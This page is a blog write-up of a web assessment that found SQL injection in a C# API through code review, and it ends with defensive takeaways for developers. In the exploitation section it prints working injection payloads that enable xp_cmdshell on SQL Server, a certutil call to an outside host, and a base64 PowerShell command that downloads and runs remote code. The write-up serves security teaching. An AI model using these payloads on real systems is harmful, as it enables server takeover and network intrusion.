<!-- Elements added to main will be displayed on all pages --> <!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=../RSyncEsxi/ rel=prev><link href=../OpenVPNDNS/ rel=next><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.5.3, mkdocs-material-9.4.8"><title>Sql Injection Through Code Analysis - deciacco.github.io</title><link rel=stylesheet href=../../assets/stylesheets/main.4b4a2bd9.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.356b1318.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../static/css/extra.css><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#stumbleing-on-a-vulnerability class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=deciacco.github.io class="md-header__button md-logo" aria-label=deciacco.github.io data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> deciacco.github.io </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Sql Injection Through Code Analysis </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <button type=reset class="md-search__icon md-icon" title=Clear aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/deciacco title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=../UpDownScript/ class=md-tabs__link> Articles </a> </li> <li class=md-tabs__item> <a href=../PHPImageMailer/ class=md-tabs__link> Tools </a> </li> <li class=md-tabs__item> <a href=../../kbase/ class=md-tabs__link> KB </a> </li> <li class=md-tabs__item> <a href=../../tags/ class=md-tabs__link> Tags </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=deciacco.github.io class="md-nav__button md-logo" aria-label=deciacco.github.io data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg> </a> deciacco.github.io </label> <div class=md-nav__source> <a href=https://github.com/deciacco title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.4.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2 checked> <label class=md-nav__link for=__nav_2 id=__nav_2_label tabindex> <span class=md-ellipsis> Articles </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_2_label aria-expanded=true> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Articles </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../UpDownScript/ class=md-nav__link> <span class=md-ellipsis> Monitor Service & Restart </span> </a> </li> <li class=md-nav__item> <a href=../RSyncEsxi/ class=md-nav__link> <span class=md-ellipsis> Rsync In ESXI </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> <span class=md-ellipsis> Finding Sql Injection Through Code Analysis </span> <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Finding Sql Injection Through Code Analysis </span> </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#stumbleing-on-a-vulnerability class=md-nav__link> Stumbleing On A Vulnerability </a> </li> <li class=md-nav__item> <a href=#verifying-execution class=md-nav__link> Verifying Execution </a> <nav class=md-nav aria-label="Verifying Execution"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#vulnerable-code class=md-nav__link> Vulnerable Code </a> </li> <li class=md-nav__item> <a href=#controller class=md-nav__link> Controller </a> </li> <li class=md-nav__item> <a href=#http-request class=md-nav__link> HTTP Request </a> </li> <li class=md-nav__item> <a href=#use-in-the-application class=md-nav__link> Use In The Application </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#exploiting class=md-nav__link> Exploiting </a> <nav class=md-nav aria-label=Exploiting> <ul class=md-nav__list> <li class=md-nav__item> <a href=#enableing-remote-code-execution class=md-nav__link> Enableing Remote Code Execution </a> </li> <li class=md-nav__item> <a href=#executing-code class=md-nav__link> Executing Code </a> </li> <li class=md-nav__item> <a href=#proof-of-code-execution class=md-nav__link> Proof of Code Execution </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#takeaways class=md-nav__link> Takeaways </a> <nav class=md-nav aria-label=Takeaways> <ul class=md-nav__list> <li class=md-nav__item> <a href=#search-your-code class=md-nav__link> Search Your Code </a> </li> <li class=md-nav__item> <a href=#development-behavior class=md-nav__link> Development Behavior </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../OpenVPNDNS/ class=md-nav__link> <span class=md-ellipsis> Make OpenVPN DNS Work </span> </a> </li> <li class=md-nav__item> <a href=../PollVote/ class=md-nav__link> <span class=md-ellipsis> Poll Voter </span> </a> </li> <li class=md-nav__item> <a href=../ComcastModemMonitor/ class=md-nav__link> <span class=md-ellipsis> Comcast Modem Power Level Monitor </span> </a> </li> <li class=md-nav__item> <a href=../AHKGithubPrivate/ class=md-nav__link> <span class=md-ellipsis> Private GitHub Repo and Autohokey </span> </a> </li> <li class=md-nav__item> <a href=../MonitorFolderService/ class=md-nav__link> <span class=md-ellipsis> Monitor Folder With PHP </span> </a> </li> <li class=md-nav__item> <a href=../BetterSendTo/ class=md-nav__link> <span class=md-ellipsis> A Better "Send to Mail Recipient" With Outlook </span> </a> </li> <li class=md-nav__item> <a href=../LblPrint/ class=md-nav__link> <span class=md-ellipsis> Label Printer (Showcase) </span> </a> </li> <li class=md-nav__item> <a href=../PHPFtpBackupTool/ class=md-nav__link> <span class=md-ellipsis> PHP Ftp Backup Library </span> </a> </li> <li class=md-nav__item> <a href=../DilbertSyncAsync/ class=md-nav__link> <span class=md-ellipsis> C# .NET 2.0 Web Service - Sync + Async </span> </a> </li> <li class=md-nav__item> <a href=../PHPOpenSSL/ class=md-nav__link> <span class=md-ellipsis> PHP, OpenSSL and ftp_ssl_connect() on Win32 </span> </a> </li> <li class=md-nav__item> <a href=../GetHtml/ class=md-nav__link> <span class=md-ellipsis> GetHtml </span> </a> </li> <li class=md-nav__item> <a href=../SMTPSinks/ class=md-nav__link> <span class=md-ellipsis> SMTP Sinks </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3 id=__nav_3_label tabindex> <span class=md-ellipsis> Tools </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_3_label aria-expanded=false> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3_1> <label class=md-nav__link for=__nav_3_1 id=__nav_3_1_label tabindex=0> <span class=md-ellipsis> Old Programs </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_3_1_label aria-expanded=false> <label class=md-nav__title for=__nav_3_1> <span class="md-nav__icon md-icon"></span> Old Programs </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../PHPImageMailer/ class=md-nav__link> <span class=md-ellipsis> Image Mailer </span> </a> </li> <li class=md-nav__item> <a href=../PHPImageResizer/ class=md-nav__link> <span class=md-ellipsis> Image Resizer </span> </a> </li> <li class=md-nav__item> <a href=../BatchRun/ class=md-nav__link> <span class=md-ellipsis> Batch Run </span> </a> </li> <li class=md-nav__item> <a href=../UtFiles/ class=md-nav__link> <span class=md-ellipsis> UTFiles </span> </a> </li> <li class=md-nav__item> <a href=../SmtpTester/ class=md-nav__link> <span class=md-ellipsis> SmtpTester </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4> <div class="md-nav__link md-nav__container"> <a href=../../kbase/ class="md-nav__link "> <span class=md-ellipsis> KB </span> </a> <label class="md-nav__link " for=__nav_4 id=__nav_4_label tabindex> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_4_label aria-expanded=false> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> KB </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../kbase/malphish/ class=md-nav__link> <span class=md-ellipsis> Phishing </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_4_3> <label class=md-nav__link for=__nav_4_3 id=__nav_4_3_label tabindex=0> <span class=md-ellipsis> Pond (w Phish!) </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_4_3_label aria-expanded=false> <label class=md-nav__title for=__nav_4_3> <span class="md-nav__icon md-icon"></span> Pond (w Phish!) </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../kbase/pond/phish001/ class=md-nav__link> <span class=md-ellipsis> Example Phish 001 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish002/ class=md-nav__link> <span class=md-ellipsis> Example Phish 002 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish003/ class=md-nav__link> <span class=md-ellipsis> Example Phish 003 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish004/ class=md-nav__link> <span class=md-ellipsis> Example Phish 004 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish005/ class=md-nav__link> <span class=md-ellipsis> Example Phish 005 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish006/ class=md-nav__link> <span class=md-ellipsis> Example Phish 006 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish007/ class=md-nav__link> <span class=md-ellipsis> Example Phish 007 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish008/ class=md-nav__link> <span class=md-ellipsis> Example Phish 008 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish009/ class=md-nav__link> <span class=md-ellipsis> Example Phish 009 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish010/ class=md-nav__link> <span class=md-ellipsis> Example Phish 010 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish011/ class=md-nav__link> <span class=md-ellipsis> Example Phish 011 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish012/ class=md-nav__link> <span class=md-ellipsis> Example Phish 012 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish013/ class=md-nav__link> <span class=md-ellipsis> Example Phish 013 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish014/ class=md-nav__link> <span class=md-ellipsis> Example Phish 014 </span> </a> </li> <li class=md-nav__item> <a href=../../kbase/pond/phish015/ class=md-nav__link> <span class=md-ellipsis> Example Phish 015 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../kbase/hipaa164/ class=md-nav__link> <span class=md-ellipsis> HIPAA Rules </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../tags/ class=md-nav__link> <span class=md-ellipsis> Tags </span> </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <nav class=md-tags hidden> <a href=../../tags/#appsec class=md-tag>appsec</a> <a href=../../tags/#sqli class=md-tag>sqli</a> </nav> <h1>Finding Sql Injection Through Code Analysis</h1> <p><em>Published: 2022-09-25</em></p> <h2 id=stumbleing-on-a-vulnerability>Stumbleing On A Vulnerability</h2> <p>Some time ago on a web assesment, while looking over code, I came to a file that was particularly interesting -- it was packed full with lines of raw SQL statements. It was written in C# and most of the SQL was quoted inside of the <code>string.format</code> function. Unfortunately, user input was being substitued into the SQL statements, so I immediatly thought one thing -- SQL Injection!</p> <p>Before getting too excited, I had to first determine whether any of the code was even being used by the application. Just beacuse the code was there didn't mean it was actually utilized. The application had quite a large codebase and had been around for a while, so it was possible that code wasn't even being used.</p> <h2 id=verifying-execution>Verifying Execution</h2> <p>In order to verify if the code executed I had to start tracing it back. I started with the line of code and worked back up to the function definiton. From there I searched for where that function might be called and so on. I worked my way up the call stack, and not long after, I found myself in the controller. From there I could easily determine the URL endpoint that would need to be called and any parameters that needed to be sent. All that was left was to determine if it was accessbile and used in the application. </p> <div class="admonition note"> <p class=admonition-title>Note</p> <ul> <li>While the code structure is identical to the original, it has all been rewritten to hide any proprietary information. . </li> </ul> </div> <h3 id=vulnerable-code>Vulnerable Code</h3> <ul> <li>The initial finding -- You can see the raw SQL with the potential injection point.</li> <li>Anything sent in the place of the <em>scKey</em> (DEMO001 from the URL) will get inserted into the query and sent to the database.</li> </ul> <div class=highlight><pre><span></span><code><span class=k>public</span><span class=w> </span><span class=n>IEnumerable</span><span class=o>&lt;</span><span class=n>CompanyImageDto</span><span class=o>&gt;</span><span class=w> </span><span class=n>GetCompanyImage</span><span class=p>(</span><span class=kt>string</span><span class=w> </span><span class=n>scKey</span><span class=p>,</span><span class=w> </span><span class=kt>int?</span><span class=w> </span><span class=n>coId</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=n>IEnumerable</span><span class=o>&lt;</span><span class=n>CompanyImageDto</span><span class=o>&gt;</span><span class=w> </span><span class=n>returnable</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Query</span><span class=o>&lt;</span><span class=n>CompanyImageDto</span><span class=o>&gt;</span><span class=p>(</span><span class=kt>string</span><span class=p>.</span><span class=n>Format</span><span class=p>(</span>
<span class=w>        </span><span class=s>&quot;select * from CompanyscKeyImages where scKey = &#39;{0}&#39;&quot;</span><span class=p>,</span>
<span class=w>                                                         </span><span class=o>^^^</span>
<span class=w>                                                 </span><span class=o>***</span><span class=n>INSERTION</span><span class=w> </span><span class=n>POINT</span><span class=o>***</span>
<span class=w>        </span><span class=n>scKey</span><span class=p>),</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>false</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>returnable</span><span class=p>.</span><span class=n>IsNull</span><span class=p>())</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>        </span><span class=n>returnable</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Query</span><span class=o>&lt;</span><span class=n>CompanyImageDto</span><span class=o>&gt;</span><span class=p>(</span><span class=kt>string</span><span class=p>.</span><span class=n>Format</span><span class=p>(</span>
<span class=w>            </span><span class=s>&quot;select * from CompanyscKeyImages where Companyid = {0}&quot;</span><span class=p>,</span>
<span class=w>            </span><span class=n>coId</span><span class=p>),</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>false</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>returnable</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <h3 id=controller>Controller</h3> <ul> <li>One step up from the above code, into the controller, we can see the calling function and the URL parameter being passed down.</li> </ul> <div class=highlight><pre><span></span><code><span class=na>[HttpGet]</span>
<span class=na>[Route(&quot;GetCompanyImage/{scKey}&quot;)]</span>
<span class=k>public</span><span class=w> </span><span class=kt>dynamic</span><span class=w> </span><span class=nf>GetCompanyImage</span><span class=p>([</span><span class=n>FromUri</span><span class=p>]</span><span class=w> </span><span class=kt>string</span><span class=w> </span><span class=n>scKey</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>var</span><span class=w> </span><span class=n>coImgList</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>service</span><span class=p>.</span><span class=n>UserService</span><span class=p>.</span><span class=n>GetCompanyImage</span><span class=p>(</span><span class=n>scKey</span><span class=p>);</span>
<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>coImgList</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div> <h3 id=http-request>HTTP Request</h3> <ul> <li>One more step up and we can see the API endpoint and HTTP request with the paramter (<em>scKey</em>)</li> <li>The 'scKey" parameter is where we can try to insert our SQL.</li> </ul> <div class=highlight><pre><span></span><code>GET /api/user/getCompanyImage/DEMO001 HTTP/1.1
                              ^^^^^^^
                            ***SCKEY***
</code></pre></div> <h3 id=use-in-the-application>Use In The Application</h3> <p>Once the API endpoint and parameter were found, it was time to verify that indeed the application was vulnerable to SQL Injection. In other words:</p> <ul> <li><em>Is this API endpoint used in the application?</em> </li> <li><em>Is it accessible?</em></li> </ul> <p>In the test environment, it was as simple as going directly to the url as shown below.</p> <p>Because this was MS SQL Server on Windows a simple <em>' OR 1=1--'</em> was sufficient to trigger the code without error and verifying a way into the backed server.</p> <div class=highlight><pre><span></span><code>GET /api/user/getCompanyImage/&#39;%20OR%201=1--&#39; HTTP/1.1
                               ^^^^^^^^^^^^^
                               ***SQL TEST***
</code></pre></div> <h2 id=exploiting>Exploiting</h2> <p>After determening that the URL was accessible, it was time to show how it could be used in an attack. In short, this was the <em>Proof of Concept</em> of where this vulnerability could lead.</p> <p>Certainly, injecting and executing SQL directly to the database can have catastrophic consequences by itself. However, for the purposes of this POC, I wanted to go a bit further and show that in additon to data theft, this could potentially lead to further compromise.</p> <h3 id=enableing-remote-code-execution>Enableing Remote Code Execution</h3> <p>We use the SQL Server stored procedure <code>sp_configure</code> to make changes to the settings of the current server. </p> <p>First, we need to allow advanced options to be changed.</p> <p><code>sp_configure</code> to enable <code>show advanced options</code></p> <div class=highlight><pre><span></span><code>&#39;;EXEC%20sp_configure%20&#39;show%20advanced%20options&#39;,%201;%20RECONFIGURE;--
</code></pre></div> <p>Next, if not enabled, we attempt to enable the feature <code>xp_cmdshell</code> which will allow a command shell to be spawned.</p> <p><code>sp_configure</code> to enable <code>xp_cmdshell</code></p> <div class=highlight><pre><span></span><code>&#39;;EXEC%20sp_configure%20&#39;xp_cmdshell&#39;,%201;%20RECONFIGURE;--
</code></pre></div> <h3 id=executing-code>Executing Code</h3> <p>Once xp_cmdshell is available, we attempt to get a PowerShell instance and use it to run the command below. We encoded in Base64 to pass it in the web request.</p> <p>Command: </p> <div class=highlight><pre><span></span><code>certutil.exe -urlcache -f http://xxx.xxx.xxx.xxx/testing12345
</code></pre></div> <p>Full Command w/ encoded:</p> <div class=highlight><pre><span></span><code>&#39;;EXEC%20xp_cmdshell%20%27powershell%20-enc%20SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAyADAALgAyADIAOAAuADIAMwA2AC4AMQAyADMAOgA4ADAAOAAwAC8AYQBiAGMAJwApACkA%27--&#39;
</code></pre></div> <h3 id=proof-of-code-execution>Proof of Code Execution</h3> <p>Looking at the logs on the external server (this server would be at the IP address listed in the command), we can see the Certutil command was executed with the connection attempt requesting the 'testing12345' resource.</p> <p><img alt src=../../static/img/image-20220503152530239.png></p> <p>This shows that all commands injected were successfull and that we have the ability for remote code execution. At this point we could encode a reverse shell to gain a foothold on the SQL Server and make our way through the network.</p> <h2 id=takeaways>Takeaways</h2> <h3 id=search-your-code>Search Your Code</h3> <p>A simple search in code for "markers" of vulnerabilities can lead to some interesting findings. For instance, in C# that could be "string.format" or in more generic terms, you could simply search for "select *" and then look at how variables are placed into the sql statement. Either way, this is a simple thing all developers can easily implement into their development lifecycle.</p> <h3 id=development-behavior>Development Behavior</h3> <p>It's one thing to find a few instanaces of vulnerable code, but the same "pattern" used throughout the app is development "behavior". Perhaps it's outdated code, or a lack of security awareness or training that lead to coding practices that introduce vulnerabilities. In some cases, time constraints and project pressures may lead developers to prioritize speed over security, resulting in insecure code patterns.</p> <p>Whatever the reason, vulnerabilities, especially relatively simple ones, should be removed as part of a continuous code assesment built into the development process. Even at a very basic level, a library of vulnerable code patterns could be maintained and each new release scanned against it. This simple, cost effective step, can make an application more secure and allow security testing to focus in harder to automate areas like business logic vulnerabilities.</p> </article> </div> </div> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <!-- Copyright and theme information --> <div class=md-footer-copyright> </div> <div class=md-social> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.tabs", "toc.integrate", "navigation.path", "navigation.indexes"], "search": "../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script> <script src=../../assets/javascripts/bundle.81fa17fe.min.js></script> </body> </html>